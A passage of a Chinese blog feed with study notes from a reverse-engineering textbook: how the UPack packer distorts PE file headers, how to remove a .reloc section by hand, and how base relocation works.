src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214202146623.png" alt="图18-10"></p><p>使用调试器查看反汇编代码，如图18-11所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214202701713.png" alt="图18-11"></p><p>图18-11并不是PE文件头中的信息，而是UPack中使用的代码。若PE相关实用工具将其识别为PE文件头信息，就会引发错误，导致程序无法正常运行。</p><h2 id="18-5-3-IMAGE-OPTIONAL-HEADER-NumberOfRvaAndSizes"><a href="#18-5-3-IMAGE-OPTIONAL-HEADER-NumberOfRvaAndSizes" class="headerlink" title="18.5.3 IMAGE_OPTIONAL_HEADER.NumberOfRvaAndSizes"></a>18.5.3 IMAGE_OPTIONAL_HEADER.NumberOfRvaAndSizes</h2><p>从IMAGE_OPTIONAL_HEADER结构体中可以看到，其NumberOfRvaAndSizes的值也发生了改变，这样做的目的也是为了向文件头插入自身代码。</p><p>NumberOfRvaAndSizes值用来指岀紧接在后面的IMAGE_DATA_DIRECTORY结构体数组的元素个数。正常文件中IMAGE_DATA_DIRECTORY数组元素的个数为10,但在UPack中将其更改为了A个（参考图18-12中的框选区域）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214204026759.png" alt="图18-12"></p><p>IMAGE_DATA_DIRECTORY结构体数组元素的个数已经被确定为10，但PE规范将NumberOfRvaAndSizes值作为数组元素的个数（类似于前面讲解过的SizeOfOptionalHeader ）。所 以UPack中IMAGE_DATA_DIRECTORY结构体数组的后6个元素被忽略。</p><p>表18-1中已经对IMAGE_DATA_DIRECTORY结构体数组的各项进行了说明。其中粗斜体的项如果更改不正确，就会引发运行错误。</p><table><thead><tr><th>索引</th><th>内容</th></tr></thead><tbody><tr><td>0</td><td>Export Directory</td></tr><tr><td>1</td><td><strong>Import Directory</strong></td></tr><tr><td>2</td><td><strong>Resource Directory</strong></td></tr><tr><td>3</td><td><strong>Exception Directory</strong></td></tr><tr><td>4</td><td>Security Directory</td></tr><tr><td>5</td><td>Base Relocation Table</td></tr><tr><td>6</td><td><strong>Debug Directory</strong></td></tr><tr><td>7</td><td>Architecture Specific Data</td></tr><tr><td>8</td><td>RVA of GP</td></tr><tr><td>9</td><td><strong>TLS Directory</strong></td></tr><tr><td>10</td><td><strong>Load Configuration Directory</strong></td></tr><tr><td>11</td><td><strong>Bound Import Directory in headers</strong></td></tr><tr><td>12</td><td><strong>Import Address Table</strong></td></tr><tr><td>13</td><td>Delay Load Import Descriptors</td></tr><tr><td>14</td><td><strong>COM Runtime descriptor</strong></td></tr></tbody></table><p>UPack将IMAGE_OPTIONAL_HEAD£R.NumberOfRvaAndSizes的值更改为A，从LOAD_CONFIG项（文件偏移D8以后）开始不再使用。UPack就在这块被忽视的IMAGE_DATA_ DIRECTORY区域中覆写自己的代码。UPack真是精打细算，充分利用了文件头的每一个字节。<br>接下来使用Hex Editor查看IMAGE DATA DIRECTORY结构体数组区域，如图18-13所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214205554342.png" alt="图18-13"></p><p>图18-13中淡色显示的部分是正常文件的IMAGE_DATA_DIRECTORY结构体数组区域，其下深色显示的是UPack忽视的部分（D8~107区域&#x3D;LOAD_CONFIG Directory之后）。使用调试器查看被忽视的区域，将看到UPack自身的解码代码，如图18-11所示。</p><p>另外，NumberOfRvaAndSizes的值改变后，在OllyDbg中打开该文件就会弹岀如图18-14所示的错误消息框。</p><p>OllyDbg检查PE文件时会检查NumberOfRvaAndSizes的值是否为10，这个错误信息并不重要，可以忽略。使用其他插件也可完全删除，仅供参考。</p><h2 id="18-5-4-IMAGE-SECTION-HEADER"><a href="#18-5-4-IMAGE-SECTION-HEADER" class="headerlink" title="18.5.4 IMAGE_SECTION_HEADER"></a>18.5.4 IMAGE_SECTION_HEADER</h2><p>IMAGE_SECTION_HEADER结构体中，Upack会把自身数据记录到程序运行不需要的项目。这与UPack向PE文件头中不使用的区域覆写自身代码与数据的方法是一样的（PE文件头中未使用的区域比想象的要多）。</p><p>在前面的学习中，我们已经知道节区数是3个，IMAGE_SECTION_HEADER结构体数组的起始位置为170。下面使用Hex Editor查看IMAGE_SECTION_HEADER结构体（偏移170~1E7的区域），如图18-15所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214205858835.png" alt="图18-15"></p><p>图18-15显示的即是IMAGE_SECTION_HEADER的结构体，为便于查看，将其中数据整理如下（使用的是我亲自制作的PE Viewer ）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214210042054.png" alt="image-20211214210042054"></p><p>代码18-1框选的结构体成员对程序运行没有任何意义。比如文件偏移1B0地址处的offset to relocations值为0100739D，它为原notepad.exe的EP值。此外，节区头中还隐藏着一些秘密（马上就会讲到）。</p><h2 id="18-5-5重叠节区"><a href="#18-5-5重叠节区" class="headerlink" title="18.5.5重叠节区"></a>18.5.5重叠节区</h2><p>UPack的主要特征之一就是可以随意重叠PE节区与文件头（刚刚学过PE文件头基础知识的朋友可能会对这种技法感到惊慌失措）。</p><p>通过Stud_PE提供的简略视图查看UPack的IMAGE_SECTION_HEADER。请选择Stu_PE的 “Section”选项卡，如图18-16所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214210236712.png" alt="图18-16"></p><p>从图18-16中可以看到，其中某些部分看上去比较奇怪。首先是第一个与第三个节区的文件起始偏移（RawOffset）值都为10。偏移10是文件头区域，UPack中该位置起即为节区部分。</p><p>然后让入感到奇怪的部分是，第一个节区与第三个节区的文件起始偏移与在文件中的大小（RawSize ）是完全一致的。但是，节区内存的起始RVA（ VirtualOffset）项与内存大小（VirtualSize ）值是彼此不同的。根据PE规范，这样做不会有什么问题（更准确地说，PE规范并未明确指出这样做是不行的）。</p><p>综合以上两点可知，UPack会对PE文件头、第一个节区、第三个节区进行重叠。仅从数字上很难真正理解其中的含义，为了帮助各位更好地掌握，图18-17描述了UPack重叠的情形。 图18-17左侧描述的是文件中的节区信息，右侧描述的是内存中的节区信息。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214210703591.png" alt="image-20211214210703591"></p><p>根据节区头（IMAGE_SECTION_HEADER ）中定义的值，PE装载器会将文件偏移0~IFF的区域分别映射到3个不同的内存位置（文件头、第一个节区、第三个节区）。也就是说，用相同的文件映像可以分别创建岀处于不同位置的、大小不同的内存映像，请各位注意。</p><p>文件的头（第一&#x2F;第三个节区）区域的大小为200,其实这是非常小的。相反，第二个节区（ 2nd Section ）尺寸（AE28）非常大，占据了文件的大部分区域，原文件（notepad.exe）即压缩于此。另外一个需要注意的部分是内存中的第一个节区区域，它的内存尺寸为14000,与原文件（notepad.exe）的Size of Image具有相同的值。也就是说，压缩在第二个节区中的文件映像会被原样解压缩到第一个节区（notepad的内存映像）。另外，原notepad.exe拥有3个节区，它们被解压到一个节区。</p><p>解压缩后的第一个节区如图18-18所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214210833128.png" alt="image-20211214210833128"></p><p>重新归纳整理一下，压缩的notepad在内存的第二个节区，解压缩的同时被记录到第一个节区。重要的是，notepad.exe （原文件）的内存映像会被整体解压，所以程序能够正常运行（地址变得准确而一致）。</p><h2 id="18-5-6-RVA-to-RAW"><a href="#18-5-6-RVA-to-RAW" class="headerlink" title="18.5.6 RVA to RAW"></a>18.5.6 RVA to RAW</h2><p>各种PE实用程序对Upack束手无策的原因就是无法正确进行RVA→RAW的变换。UPack的制作者通过多种测试（或对PE装载器的逆向分析）发现了Windows PE装载器的Bug （或者异常处理），并将其应用到UPack。</p><p>PE实用程序第一次遇到应用了这种技法的文件时，大部分会出现“错误的内存引用，非正常终止”（后来许多实用程序对此进行了修复）。</p><p>首先复习一下RVA→RAW变换的常规方法。</p><blockquote><p>RAW - PointerToRawData &#x3D; RVA - VirtualAddress<br>RAW &#x3D; RVA - VirtualAddress + PointerToRawData<br>VirtualAddress, PointerToRawData是从RVA所在的节区头中获取的值，它们都是已知值（known value）。</p></blockquote><p>根据上述公式，算一下EP的文件偏移量（RAW）。UPack的EP是RVA 1018（参考图18-19）。</p><p>RAW &#x3D; 1018 - 1000 + 10 &#x3D; 28</p><blockquote><p>1st Section的VirtualAddress为 1000, PointerToRawData为 10。 </p></blockquote><p>使用Hex Editor打开RAW 28区域査看，如图18-20所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214211627076.png" alt="图18-20"></p><p>RAW 28不是代码区域，而是（ordinal:010B） “LoadLibraryA”字符串区域。现在UPack的这种 把戏欺骗了我们（实际上，OllyDbg的早期版本并不能找岀UPack的EP）。秘密就在于第一个节区的PointerToRawData值10。</p><p>一般而言，指向节区开始的文件偏移的PointerToRawData值应该是FileAlignment的整数倍。UPack的FileAlignment为200，故PointerToRawData值应为0、200、400、600等值。PE装载器发现第一个节区的PointerToRawData （ 10 ）不是FileAlignment （ 200 ）的整数倍时，它会强制将其识别为整数倍（该情况下为0 ）。这使UPack文件能够正常运行，但是许多PE相关实用程序都会发生错误。</p><p>正常的RVA→RAW变换如下。</p><p>RAW &#x3D; 1018 - 1000 + 0 &#x3D; 18</p><blockquote><p>PointerToRawData被识别为0。 </p></blockquote><p>使用调试器查看相应区域的代码，如图18-21所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214212113540.png" alt="图18-21"></p><p>现在各位应该能够对UPack文件进行正常的RVA→RAW换算了。</p><h2 id="18-5-7-导入表（IMAGEJMPORT—DESCRIPTOR-array）"><a href="#18-5-7-导入表（IMAGEJMPORT—DESCRIPTOR-array）" class="headerlink" title="18.5.7 导入表（IMAGEJMPORT—DESCRIPTOR array）"></a>18.5.7 导入表（IMAGEJMPORT—DESCRIPTOR array）</h2><p>UPack的导入表（Import Table ）组织结构相当独特（暗藏玄机）。</p><p>下面使用Hex Editor查看IMAGE_IMPORT_DESCRIPTOR结构体。首先要从Directory Table中获取IDT （IMAGE_IMPORT_DESCRIPTOR结构体数组）的地址，如图18-22所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214212254899.png" alt="图18-22"></p><p>图18-22右侧框选的8个字节大小的data就是指向导入表的IMAGE_DATA_DIRECTORY结构体。前面4个字节为导入表的地址（RVA），后面4个字节是导入表的大小（Size）。从图中可以看到导入表的RVA为271EE。</p><p>使用Hex Editor查看之前，需要先进行RVA→RAW变换。首先确定该RVA值属于哪个节区，内存地址271EE在内存中是第三个节区（参考图18-23）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214212420706.png" alt="图18-23"></p><p>进行RVA→RAW变换，如下所示。</p><p>RAW &#x3D; RVA（271EE） - VirtualOffset（27000） + RawOffset（0）&#x3D; 1EE</p><blockquote><p>注意： 3rd Section的RawOffset值不是10,而会被强制变换为0。</p></blockquote><p>使用Hex Editor查看文件偏移1EE中的数据，如图18-24所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214212842487.png" alt="图18-24"></p><p>该处就是使用UPack节区隐藏玄机的地方。</p><p>首先看一下代码18-2中IMAGE_IMPORT_DESCRIPTOR结构体的定义，再继续分析（结构体的大小为14h字节）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//@[comment(&quot;MVI_tracked&quot;)]</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD   Characteristics;            <span class="hljs-comment">// 0 for terminating null import descriptor</span><br>        DWORD   OriginalFirstThunk;         <span class="hljs-comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span><br>        <span class="hljs-comment">// In other words, INT(Import Name Table)</span><br>    &#125; DUMMYUNIONNAME;<br>    DWORD   TimeDateStamp;                  <span class="hljs-comment">// 0 if not bound,</span><br>                                            <span class="hljs-comment">// -1 if bound, and real date\time stamp</span><br>                                            <span class="hljs-comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span><br>                                            <span class="hljs-comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span><br><br>    DWORD   ForwarderChain;                 <span class="hljs-comment">// -1 if no forwarders</span><br>    DWORD   Name;<br>    DWORD   FirstThunk;                     <span class="hljs-comment">// RVA to IAT (if bound this IAT has actual addresses)</span><br>    <span class="hljs-comment">// IAT(Import Address Table)</span><br>&#125; IMAGE_IMPORT_DESCRIPTOR;<br><span class="hljs-keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;<br></code></pre></td></tr></table></figure><p>根据PE规范，导入表是由一系列IMAGE_IMPORT_DESCRIPTOR结构体组成的数组，最后以一个内容为NULL的结构体结束。 图18-24中所选区域就是IMAGE_IMPORT_DESCRIPTOR结构体数组（导入表）。偏移1EE~201为第一个结构体，其后既不是第二个结构也不是（表示导入表结束的）NULL结构体。</p><p>乍一看这种做法分明是违反PE规范的。但是请注意图18-24中偏移200上方的粗线。该线条表示文件中第三个节区的结束（参考图18-23）。故运行时偏移在200以下的部分不会映射到第三个节区内存。下面看一下图18-25。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214213157101.png" alt="图18-25"></p><p>第三个节区加载到内存时，文件偏移0~IFF的区域映射到内存的27000~271FF区域，而（第三个节区其余的内存区域）27200~28000区域全部填充为NULL。使用调试器查看相同区域，如图18-26所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214213409599.png" alt="图18-26"></p><p>准确地说，只映射到010271FF，从01027200开始全部填充为NULL值。再次返回PE规范的导入表条件，01027202地址以后出现NULL结构体，这并不算违反PE规范。而这正是UPack使用节区的玄机。从文件看导入表好像是损坏了，但其实它已在内存中准确表现出来。</p><p>大部分PE实用程序从文件中读导入表时都会被这个玄机迷惑，査找错误的地址，继而引起内存引用错误，导致程序非正常终止（一句话—这个玄机还真是妙）。</p><p><strong>问题：剩下的IMAGE_IMPORT_DESCRIPTOR呢？</strong></p><h2 id="18-5-8-导入地址表"><a href="#18-5-8-导入地址表" class="headerlink" title="18.5.8 导入地址表"></a>18.5.8 导入地址表</h2><p>UPack都输入了哪些DLL中的哪些API呢？下面通过分析IAT查看。把代码18-2的IMAGE_IMPORT_DESCRIPTOR结构体与图18-24进行映射后，得到下表18-2。 </p><p>表18-2 UPack的 IMAGE_MPORT_DESCRIPTOR结构体的重要成员</p><table><thead><tr><th align="center">偏移</th><th align="center">成员</th><th align="center">RVA</th></tr></thead><tbody><tr><td align="center">IEE</td><td align="center">OriginalFirstThunk（INT）</td><td align="center">0</td></tr><tr><td align="center">IFA</td><td align="center">Name</td><td align="center">2</td></tr><tr><td align="center">IFE</td><td align="center">FirstThunk（IAT）</td><td align="center">11E8</td></tr></tbody></table><p>首先Name的RVA值为2,它属于Header区域（因为第一个节区是从RVA 1000开始的）。Header区域中RVA与RAW值是一样的，故使用Hex Editor查看文件中偏移（RAW）为2的区域，如图18-27所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214220023185.png" alt="图18-27"></p><p>在偏移为2的区域中可以看到字符串KERNEL32.DLL。该位置原本是DOS头部分（IMAGE_DOS_HEADER ），属于不使用的区域，UPack将Import DLL名称写入该处。空白区域一点儿都没浪费（好节俭的UPack）。得到DLL名称后，再看一下从中导入了哪些API函数。</p><p>一般而言，跟踪OriginalFirstThunk （INT）能够发现API名称字符串，但是像UPack这样，OriginalFirstThunk （INT）为0时，跟踪FirstThunk （IAT）也无妨（只要INT、IAT其中一个有API名称字符串即可）。IAT的值为11E8，由图18-23可知，属于第一个节区，故RVA→RAW换算如下。</p><p>RAW &#x3D; RVA（11E8） - VirtualOffset（1000） + RawOffset（0） &#x3D; 1E8</p><blockquote><p>注意：1st Section的RawOffset值不是10,而是被强制转换为0。</p></blockquote><p>IAT的文件偏移1E8显示在图18-28中。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214220216990.png" alt="图18-28"></p><p>图18-28中框选的部分就是IAT域，同时也作为INT来使用。也就是说，该处是Name Pointer（RVA）数组，其结束是NULL。此外还可以看到导入了2个API，分别为RVA 28与BE。</p><p>RVA位置上存在着导入函数的[ordinal名称字符串]，如图18-29所示。由于都是header区域，所以RVA与RAW值是一样的。</p><p>从图18-29中可以看到导入的2个API函数，分另为LoadLibraryA与GetProcAddress，它们在形成原文件的IAT时非常方便，所以普通压缩器也常常导入使用。</p><h1 id="18-6小结"><a href="#18-6小结" class="headerlink" title="18.6小结"></a>18.6小结</h1><p>本章详细讲解了UPack的独特PE文件头相关知识。学习PE文件格式时虽然未涉及各结构体的所有成员，但分析UPack压缩的可执行文件的PE文件头（PE文件头变形得很厉害），会进一步加深大家对PE文件格式的了解。这些内容虽然对初学者有些难，但是如果多努力去理解并掌握这些内容，以后无论遇到什么样的PE文件头都能轻松分析。</p><blockquote><p>Q. UPack压缩器是病毒文件吗？<br>A. UPack压缩器本身不是恶意程序。但是许多恶意代码制作者用UPack来压缩自己的恶意代<br>码，使文件变得畸形，所以许多杀毒软件将UPack压缩的文件全部识别为病毒文件并删除。</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第18章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第17章 从可执行文件中删除.reloc节区</title>
    <link href="/1999/02/15/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC17%E7%AB%A0%20%E4%BB%8E%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%AD%E5%88%A0%E9%99%A4.reloc%E8%8A%82%E5%8C%BA/"/>
    <url>/1999/02/15/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC17%E7%AB%A0%20%E4%BB%8E%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%AD%E5%88%A0%E9%99%A4.reloc%E8%8A%82%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<p>第17章从可执行文件中删除.reloc节区<br>本章将通过练习使大家了解从PE文件中手动删除.reloc节区的方法，这将大大加深各位对PE文件格式的理解，同时进一步熟悉Hex Editor等工具的使用。</p><h1 id="17-1-reloc-节区"><a href="#17-1-reloc-节区" class="headerlink" title="17.1 .reloc 节区"></a>17.1 .reloc 节区</h1><p>EXE形式的PE文件中，“基址重定位表”项对运行没什么影响。实际上，将其删除后程序仍然正常运行（基址重定位表对DLL&#x2F;SYS形式的文件来说几乎是必需的）。</p><blockquote><p>在高版本的启动了ASLR后的Windows中，reloc节区对于EXE文件就是必须的了。</p></blockquote><p>VC++中生成的PE文件的重定位节区名为.reloc，删除该节区后文件照常运行，且文件大小将缩减（实际上存在这种实用小程序）。.reloc节区一般位于所有节区的最后，删除这最后一个（不使用的）节区不像想得那么难。只使用PEView与Hex Editor （手动删除）就足够了。</p><h1 id="17-2-reloc-exe"><a href="#17-2-reloc-exe" class="headerlink" title="17.2 reloc.exe"></a>17.2 reloc.exe</h1><p>若想准确删除位于文件末尾的.reloc节区，需要按照以下4个步骤操作。</p><blockquote><p>步骤1 - 整理.reloc节区头；<br>步骤2 - 删除.reloc节区；<br>步骤3 - 修改IMAGE_FILE_HEADER;<br>步骤4 - 修改IMAGE_OPTIONAL_HEADER。</p></blockquote><h2 id="17-2-1-删除-reloc节区头"><a href="#17-2-1-删除-reloc节区头" class="headerlink" title="17.2.1 删除.reloc节区头"></a>17.2.1 删除.reloc节区头</h2><p>从图17-1可以看到，.reloc节区头从文件偏移270处开始，大小为28。使用Hex Editor打开该区域（270〜297 ），全部用0覆盖填充（使用HxD的“Fill selection…”功能会比较方便），如图17-2所示。</p><h2 id="17-2-2-删除-reloc节区"><a href="#17-2-2-删除-reloc节区" class="headerlink" title="17.2.2 删除.reloc节区"></a>17.2.2 删除.reloc节区</h2><p>从图17-1可以看到，文件中.reloc节区的起始偏移为C000（由此开始到文件末尾为.reloc节区）。 从C000偏移开始一直使用Hex Editor删除到文件末端所有数据（使用HxD的“Delete”功能更方便），如图17-3所示。</p><p>这样，.reloc节区即被物理删除。但是由于尚未修改其他PE头信息，文件仍无法正常运行。<br>下面开始修改相关PE头信息，使文件最终能够正常运行。</p><h2 id="17-2-3-修改-IMAGE-FILE-HEADER"><a href="#17-2-3-修改-IMAGE-FILE-HEADER" class="headerlink" title="17.2.3 修改 IMAGE_FILE_HEADER"></a>17.2.3 修改 IMAGE_FILE_HEADER</h2><p>删除1个节区后，首先要修改IMAGE_FILE_HEADER-Number ofSections项，如图17-4所示。</p><p>当前Number of Sections项的值为5，删除1个节区后要把其值改为4，如图17-5所示。</p><h2 id="17-2-4-修改-IMAGE-OPTIONAL-HEADER"><a href="#17-2-4-修改-IMAGE-OPTIONAL-HEADER" class="headerlink" title="17.2.4 修改 IMAGE_OPTIONAL_HEADER"></a>17.2.4 修改 IMAGE_OPTIONAL_HEADER</h2><p>删除.reloc节区后，（进程虚拟内存中）整个映像就随之减少相应大小。映像大小值存储在IMAGE_OPTIONAL_HEADER - size ofImage中，需要对其修改。</p><p>从图17-6可以看岀，当前Size ofImage的值为11000。问题在于，要计算减去多少才能让程序正常运行。由图17-1可知，.reloc节区的VirtualSize值为E40，将其根据Section Alignment扩展后变为1000 （练习文件的Section Alignment值为1000 ）。所以应该从Size ofImage减去1000才正确，如图17-7所示。</p><p>修改后的reloc.exe文件现在能够正常运行了。像这样，只使用PEView与Hex Editor就能随心所欲地修改可执行文件。此外还可修改最后节区的大小、添加新节区等。</p><h1 id="17-3-小结"><a href="#17-3-小结" class="headerlink" title="17.3 小结"></a>17.3 小结</h1><p>若想再多做一些与上述内容有关的练习，可以尝试向示例文件（reloc.exe）新增1个空节区，使总节区数达到6个。参考前面讲解的内容即可顺利完成。通过这样的练习可以进一步加深对PE文件的认积累更多经验，以后操作PE文件就会更加得心应手</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第17章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第16章 基址重定位表</title>
    <link href="/1999/02/14/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC16%E7%AB%A0%20%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/"/>
    <url>/1999/02/14/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC16%E7%AB%A0%20%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>PE文件在重定位过程中会用到基址重定位表（Base Relocation Table)，本章将学习其结构及操作原理。</p><h1 id="16-1-PE重定位"><a href="#16-1-PE重定位" class="headerlink" title="16.1 PE重定位"></a>16.1 PE重定位</h1><p>​向进程的虚拟内存加载PE文件（EXE&#x2F;DLL&#x2F;SYS）时，文件会被加载到PE头的ImageBase所指的地址处。若加载的是DLL (SYS)文件，且在ImageBase位置处已经加载了其他DLL（SYS）文件，那么PE装载器就会将其加载到其他未被占用的空间。这就涉及PE文件重定位的问题，PE重定位是指PE文件无法加载到ImageBase所指位置，而是被加载到其他地址时发生的一系列的处理行为。</p><blockquote><p>使用SDK（Software Development Kit,软件开发工具包）或Visual C++创建PE文件时，EXE 默认的 ImageBase 为00400000, DLL 默认的 ImageBase 为 10000000。此外，<br>使用DDK（Driver Development Kit，驱动开发工具包）创建的SYS文件默认的ImageBase为 10000。</p></blockquote><h2 id="16-1-1-DLL-x2F-SYS"><a href="#16-1-1-DLL-x2F-SYS" class="headerlink" title="16.1.1 DLL&#x2F;SYS"></a>16.1.1 DLL&#x2F;SYS</h2><p>​请看图16-1，A.DLL被加载到TEST.EXE进程的10000000地址处。此后，B.DLL试图加载到相同地址（10000000）时，PE装载器将B.DLL加载到另一个尚未被占用的地址（3C000000）处。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC16%E7%AB%A0%20%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8.assets/image-20211203155325539.png" alt="image-20211203155325539"></p><h2 id="16-1-2-EXE"><a href="#16-1-2-EXE" class="headerlink" title="16.1.2 EXE"></a>16.1.2 EXE</h2><p>​创建好进程后，EXE文件会首先加载到内存，所以在EXE中无须考虑重定位的问题。但是Windows Vista之后的版本引人了ASLR安全机制，每次运行EXE文件都会被加载到随机地址，这样大大增强了系统安全性。 </p><p>​下图是分别运行3次notepad.exe时的截图，可以明显发现，每次运行时程序都被加载到不同地址</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC16%E7%AB%A0%20%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8.assets/image-20211203185112174.png" 